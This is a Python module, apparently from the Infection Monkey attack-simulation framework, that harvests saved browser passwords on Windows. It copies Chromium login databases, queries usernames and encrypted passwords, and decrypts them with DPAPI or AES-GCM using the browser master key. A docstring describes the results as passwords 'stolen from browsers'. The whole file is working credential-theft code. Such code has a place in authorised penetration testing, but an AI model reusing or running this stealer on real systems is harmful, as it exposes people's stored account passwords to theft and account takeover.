import logging
import shutil
import sqlite3
import tempfile
from collections.abc import Callable, Collection, Iterator
from contextlib import suppress
from pathlib import Path
from typing import Optional, TypeAlias

from Cryptodome.Cipher import AES

from common.credentials import Credentials, EmailAddress, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .windows_decryption import win32crypt_unprotect_data

logger = logging.getLogger(__name__)


DATABASE_QUERY = "SELECT username_value, password_value FROM logins"

ExtractedCredentialPair: TypeAlias = tuple[str, bytes]


def get_logins_from_database(database_path: Path) -> Iterator[ExtractedCredentialPair]:
    with tempfile.NamedTemporaryFile() as temporary_database_file:
        temporary_database_path = Path(tempfile.gettempdir()) / temporary_database_file.name

        # copy database before querying it to bypass lock errors
        with open(database_path, "rb") as database_file:
            shutil.copyfileobj(database_file, temporary_database_file)

        yield from _extract_credentials(temporary_database_path)


def _extract_credentials(temporary_database_path: Path) -> Iterator[ExtractedCredentialPair]:
    try:
        conn = sqlite3.connect(temporary_database_path)
        for user, password in conn.execute(DATABASE_QUERY):
            yield user, password
    except Exception as err:
        logger.error(f"Encountered an exception while connecting to database: {err}")


DatabaseReader = Callable[[Path], Iterator[ExtractedCredentialPair]]


class WindowsCredentialsDatabaseProcessor:
    def __init__(self, database_reader: DatabaseReader = get_logins_from_database):
        self._read_logins_from_database = database_reader

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = []

        for item in interruptible_iter(database_paths, interrupt):
            for user, password in self._read_logins_from_database(item.database_file_path):
                decrypted_password = self._decrypt_password(password, item.master_key)
                if user or decrypted_password:
                    credentials.append((user, decrypted_password))
        return [
            Credentials(
                identity=self._get_identity(user),
                secret=self._get_password(password),
            )
            for user, password in set(credentials)
        ]

    @staticmethod
    def _get_identity(user: str):
        try:
            return EmailAddress(email_address=user)
        except ValueError:
            return Username(username=user)

    @staticmethod
    def _get_password(password: Optional[str]) -> Optional[Password]:
        if password is None:
            return None
        return Password(password=password)

    def _decrypt_password(
        self, encrypted_password: bytes, master_key: Optional[bytes]
    ) -> Optional[str]:
        decrypted_password = None
        try:
            if encrypted_password.startswith(b"v10"):  # chromium > v80
                decrypted_password = self._decrypt_password_v80(encrypted_password, master_key)
            else:
                with suppress(Exception):
                    password_bytes = win32crypt_unprotect_data(encrypted_password)
                    if isinstance(password_bytes, bytes):
                        decrypted_password = password_bytes.decode("utf-8")
        except Exception as err:
            logger.error(f"Encountered an exception while trying to decrypt the password: {err}")
        return decrypted_password

    def _decrypt_password_v80(
        self, encrypted_password: bytes, master_key: Optional[bytes]
    ) -> Optional[str]:
        """
        Decrypts passwords stolen from browsers with Chromium > v80
        """

        if not master_key:
            return None

        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_password = cipher.decrypt(payload)
        decrypted_password = decrypted_password[:-16].decode()  # remove suffix bytes

        if decrypted_password == "":
            return None

        return decrypted_password
